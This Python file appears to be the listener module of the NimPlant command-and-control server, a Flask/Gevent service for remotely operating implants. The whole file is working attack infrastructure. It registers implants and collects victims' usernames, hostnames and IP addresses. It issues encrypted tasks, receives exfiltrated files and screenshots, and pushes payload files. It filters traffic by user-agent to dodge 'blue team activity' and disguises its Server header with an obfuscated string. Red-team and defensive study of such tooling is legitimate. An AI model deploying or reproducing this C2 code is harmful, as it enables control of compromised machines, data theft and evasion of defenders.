from enum import unique, Enum
from ssl import PROTOCOL_TLSv1, CERT_NONE, PROTOCOL_TLSv1_2

from .config import config
from .crypto import *
from .func import *
from .nimplant import *
from .notify import notify_user
from gevent.pywsgi import WSGIServer
from zlib import decompress, compress
import base64
import flask
import gzip
import hashlib
import io
import json

from .strings import decode_base64_blob

# Parse configuration from 'config.toml'
try:
    listenerType = config["listener"]["type"]
    listenerIp = config["listener"]["ip"]
    listenerPort = config["listener"]["port"]
    registerPath = config["listener"]["registerPath"]
    taskPath = config["listener"]["taskPath"]
    resultPath = config["listener"]["resultPath"]
    userAgent = config["nimplant"]["userAgent"]
    if listenerType == "HTTPS":
        sslCertPath = config["listener"]["sslCertPath"]
        sslKeyPath = config["listener"]["sslKeyPath"]
    b_ident = b"789CF3CBCC0DC849CC2B51703652084E2D2A4B2D02003B5C0650"
except KeyError as e:
    nimplantPrint(
        f"ERROR: Could not load configuration, check your 'config.toml': {str(e)}"
    )
    os._exit(1)

# Init flask app and surpress Flask/Gevent logging and startup messages
app = flask.Flask(__name__)
ident = decompress(base64.b16decode(b_ident)).decode("utf-8")


@unique
class BadRequestReason(Enum):
    BAD_KEY = "bad_key"
    UNKNOWN = "unknown"
    NO_TASK_GUID = "no_task_id"
    ID_NOT_FOUND = "id_not_found"
    NOT_RECEIVING_FILE = "not_receiving_file"
    NOT_HOSTING_FILE = "not_hosting_file"
    INCORRECT_FILE_ID = "incorrect_file_id"
    USER_AGENT_MISMATCH = "user_agent_mismatch"

    def get_explanation(self):
        explanations = {
            self.BAD_KEY: "We were unable to process the request. This is likely caused by a XOR key mismatch between NimPlant and server! It could be an old NimPlant that wasn't properly killed or blue team activity.",
            self.NO_TASK_GUID: "No task GUID was given. This could indicate blue team activity or random internet noise.",
            self.ID_NOT_FOUND: "The specified NimPlant ID was not found. This could indicate an old NimPlant trying to reconnect, blue team activity, or random internet noise.",
            self.NOT_RECEIVING_FILE: "We've received an unexpected file upload request from a NimPlant. This could indicate a mismatch between the server and the Nimplant or blue team activity.",
            self.NOT_HOSTING_FILE: "We've received an unexpected file download request from a NimPlant. This could indicate a mismatch between the server and the Nimplant or blue team activity.",
            self.INCORRECT_FILE_ID: "The specified file id for upload/download is incorrect. This could indicate a mismatch between the server and the Nimplant or blue team activity.",
            self.USER_AGENT_MISMATCH: "User-Agent for the request doesn't match the configuration. This could indicate an old NimPlant trying to reconnect, blue team activity, or random internet noise.",
            self.UNKNOWN: "The reason is unknown."
        }

        return explanations.get(self, "The reason is unknown.")


# Define a function to notify users of unknown or erroneous requests
def notify_bad_request(request: Request, reason: BadRequestReason = BadRequestReason.UNKNOWN, np_guid: Optional[str] = None):
    source = get_external_ip(request)
    headers = dict(request.headers)
    user_agent = request.headers.get("User-Agent", "Unknown")

    nimplantPrint(f"Rejected {request.method} request from '{source}': {request.path} ({user_agent})", target=np_guid)
    nimplantPrint(f"Reason: {reason.get_explanation()}", target=np_guid)

    # Printing headers would be useful for checking if we have id or guid definitions.
    nimplantPrint("Request Headers:", target=np_guid)
    nimplantPrint(json.dumps(headers, ensure_ascii=False), target=np_guid)

    pass

# Define Flask listener to run in thread
def flaskListener(xor_key):
    @app.route(registerPath, methods=["GET", "POST"])
    # Verify expected user-agent for incoming registrations
    def getNimPlant():
        if userAgent == flask.request.headers.get("User-Agent"):
            # First request from NimPlant (GET, no data) -> Initiate NimPlant and return XORed key
            if flask.request.method == "GET":
                np = NimPlant()
                np_server.add(np)
                xor_bytes = xorString(np.cryptKey, xor_key)
                encodedKey = base64.b64encode(xor_bytes).decode("utf-8")
                return flask.jsonify(id=np.guid, k=encodedKey), 200

            # Second request from NimPlant (POST, encrypted blob) -> Activate the NimPlant object based on encrypted data
            elif flask.request.method == "POST":
                data = flask.request.json
                np = np_server.getNimplantByGuid(
                    flask.request.headers.get("X-Identifier")
                )
                data = data["data"]

                try:
                    data = decryptData(data, np.cryptKey)
                    dataJson = json.loads(data)
                    ipAddrInt = dataJson["i"]
                    ipAddrExt = get_external_ip(flask.request)
                    username = dataJson["u"]
                    hostname = dataJson["h"]
                    osBuild = dataJson["o"]
                    pid = dataJson["p"]
                    pname = dataJson["P"]
                    riskyMode = dataJson["r"]

                    np.activate(
                        ipAddrExt,
                        ipAddrInt,
                        username,
                        hostname,
                        osBuild,
                        pid,
                        pname,
                        riskyMode,
                    )

                    notify_user(np)

                    if not np_server.containsActiveNimplants():
                        np_server.selectNimplant(np.guid)

                    return flask.jsonify(status="OK"), 200

                except:
                    notify_bad_request(
                        flask.request,
                        BadRequestReason.BAD_KEY
                    )
                    return flask.jsonify(status="Not found"), 404
        else:
            notify_bad_request(
                flask.request,
                BadRequestReason.USER_AGENT_MISMATCH
            )
            return flask.jsonify(status="Not found"), 404

    @app.route(taskPath, methods=["GET"])
    # Return the first active task IF the user-agent is as expected
    def getTask():
        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
        if np is not None:
            if userAgent == flask.request.headers.get("User-Agent"):
                # Update the external IP address if it changed
                if not np.ipAddrExt == get_external_ip(flask.request):
                    nimplantPrint(f"External IP Address for NimPlant changed from {np.ipAddrExt} to {get_external_ip(flask.request)}", np.guid)
                    np.ipAddrExt = get_external_ip(flask.request)

                if np.pendingTasks:
                    # There is a task - check in to update 'last seen' and return the task
                    np.checkIn()
                    task = encryptData(str(np.getNextTask()), np.cryptKey)
                    return flask.jsonify(t=task), 200
                else:
                    # There is no task - check in to update 'last seen'
                    if np.isActive():
                        np.checkIn()
                    return flask.jsonify(status="OK"), 200
            else:
                notify_bad_request(
                    flask.request,
                    BadRequestReason.USER_AGENT_MISMATCH,
                    np.guid
                )
                return flask.jsonify(status="Not found"), 404
        else:
            notify_bad_request(
                flask.request,
                BadRequestReason.ID_NOT_FOUND
            )
            return flask.jsonify(status="Not found"), 404

    @app.route(taskPath + "/<fileId>", methods=["GET"])
    # Return a hosted file as gzip-compressed stream for the 'upload' command,
    # IF the user-agent is as expected AND the caller knows the file ID
    def uploadFile(fileId):
        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
        if np is not None:
            if userAgent == flask.request.headers.get("User-Agent"):
                if (np.hostingFile != None) and (
                    fileId == hashlib.md5(np.hostingFile.encode("utf-8")).hexdigest()
                ):
                    taskGuid: Optional[str] = None

                    try:
                        # Construct a GZIP stream of the file to upload in-memory
                        # Note: We 'double-compress' here since compression has little use after encryption,
                        #       but we want to present the file as a GZIP stream anyway
                        taskGuid = flask.request.headers.get("X-Unique-ID")

                        if taskGuid is not None:
                            with open(np.hostingFile, mode="rb") as contents:
                                processedFile = encryptData(
                                    compress(contents.read()), np.cryptKey
                                )

                            with io.BytesIO() as data:
                                with gzip.GzipFile(fileobj=data, mode="wb") as zip:
                                    zip.write(processedFile.encode("utf-8"))
                                gzippedResult = data.getvalue()

                            np.stopHostingFile()

                            # Return the GZIP stream as a response
                            res = flask.make_response(gzippedResult)
                            res.mimetype = "application/x-gzip"
                            res.headers["Content-Encoding"] = "gzip"
                            return res
                        else:
                            notify_bad_request(
                                flask.request,
                                BadRequestReason.NO_TASK_GUID,
                                np.guid
                            )
                            np.stopHostingFile()
                            return flask.jsonify(status="Not found"), 404
                    except Exception as e:
                        # Error: Could not host the file
                        nimplantPrint(
                            f"An error occurred while uploading file:\n{type(e)}:{e}",
                            np.guid,
                            taskGuid=taskGuid,
                        )
                        np.stopHostingFile()
                        return flask.jsonify(status="Not found"), 404
                else:
                    # Error: The Nimplant is not hosting a file or the file ID is incorrect
                    notify_bad_request(
                        flask.request,
                        BadRequestReason.NOT_HOSTING_FILE if np.hostingFile is None else BadRequestReason.INCORRECT_FILE_ID,
                        np.guid
                    )
                    return flask.jsonify(status="OK"), 200
            else:
                # Error: The user-agent is incorrect
                notify_bad_request(
                    flask.request,
                    BadRequestReason.USER_AGENT_MISMATCH,
                    np.guid
                )
                return flask.jsonify(status="Not found"), 404
        else:
            # Error: No Nimplant with the given GUID is currently active
            notify_bad_request(
                flask.request,
                BadRequestReason.ID_NOT_FOUND
            )
            return flask.jsonify(status="Not found"), 404

    @app.route(taskPath + "/u", methods=["POST"])
    # Receive a file downloaded from NimPlant through the 'download' command, IF the user-agent is as expected AND the NimPlant object is expecting a file
    def downloadFile():
        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
        if np is not None:
            if userAgent == flask.request.headers.get("User-Agent"):
                if np.receivingFile != None:
                    taskGuid: Optional[str] = None

                    try:
                        taskGuid = flask.request.headers.get("X-Unique-ID")
                        if taskGuid is not None:
                            uncompressed_file = gzip.decompress(
                                decryptBinaryData(flask.request.data, np.cryptKey)
                            )
                            with open(np.receivingFile, "wb") as f:
                                f.write(uncompressed_file)
                            nimplantPrint(
                                f"Successfully downloaded file to '{os.path.abspath(np.receivingFile)}' on NimPlant server.",
                                np.guid,
                                taskGuid=taskGuid,
                            )

                            np.stopReceivingFile()
                            return flask.jsonify(status="OK"), 200
                        else:
                            notify_bad_request(
                                flask.request,
                                BadRequestReason.NO_TASK_GUID,
                                np.guid
                            )
                            np.stopReceivingFile()
                            return flask.jsonify(status="Not found"), 404
                    except Exception as e:
                        nimplantPrint(
                            f"An error occurred while downloading file: {e}",
                            np.guid,
                            taskGuid=taskGuid,
                        )
                        np.stopReceivingFile()
                        return flask.jsonify(status="Not found"), 404
                else:
                    notify_bad_request(
                        flask.request,
                        BadRequestReason.NOT_RECEIVING_FILE,
                        np.guid
                    )
                    return flask.jsonify(status="OK"), 200
            else:
                notify_bad_request(
                    flask.request,
                    BadRequestReason.USER_AGENT_MISMATCH,
                    np.guid
                )
                return flask.jsonify(status="Not found"), 404
        else:
            notify_bad_request(
                flask.request,
                BadRequestReason.ID_NOT_FOUND
            )
            return flask.jsonify(status="Not found"), 404

    @app.route(resultPath, methods=["POST"])
    # Parse command output IF the user-agent is as expected
    def getResult():
        data = flask.request.json
        np = np_server.getNimplantByGuid(flask.request.headers.get("X-Identifier"))
        if np is not None:
            if userAgent == flask.request.headers.get("User-Agent"):
                res = json.loads(decryptData(data["data"], np.cryptKey))
                data = decode_base64_blob(res["result"])

                # Handle Base64-encoded, gzipped PNG file (screenshot)
                if data.startswith("H4sIAAAA"):
                    data = processScreenshot(np, data)

                np.setTaskResult(res["guid"], data)
                return flask.jsonify(status="OK"), 200
            else:
                notify_bad_request(
                    flask.request,
                    BadRequestReason.USER_AGENT_MISMATCH,
                    np.guid
                )
                return flask.jsonify(status="Not found"), 404
        else:
            notify_bad_request(
                flask.request,
                BadRequestReason.ID_NOT_FOUND
            )
            return flask.jsonify(status="Not found"), 404

    @app.errorhandler(Exception)
    def all_exception_handler(error):
        nimplantPrint(
            f"Rejected {flask.request.method} request from '{get_external_ip(flask.request)}' to {flask.request.path} due to error: {error}"
        )

        dump_debug_info_for_exception(error, flask.request)

        return flask.jsonify(status="Not found"), 404

    @app.after_request
    def changeserver(response):
        response.headers["Server"] = ident
        return response

    # Run the Flask web server using Gevent
    if listenerType == "HTTP":
        try:
            http_server = WSGIServer((listenerIp, listenerPort), app, log=None)
            http_server.serve_forever()
        except Exception as e:
            nimplantPrint(
                f"ERROR: Error setting up web server. Verify listener settings in 'config.toml'. Exception: {e}"
            )
            os._exit(1)
    else:
        try:
            https_server = WSGIServer(
                (listenerIp, listenerPort),
                app,
                keyfile=sslKeyPath,
                certfile=sslCertPath,
                ssl_version=PROTOCOL_TLSv1_2,
                cert_reqs=CERT_NONE,
                log=None,
            )
            https_server.serve_forever()
        except Exception as e:
            nimplantPrint(
                f"ERROR: Error setting up SSL web server. Verify 'sslCertPath', 'sslKeyPath', and listener settings in 'config.toml'. Exception: {e}"
            )
            os._exit(1)
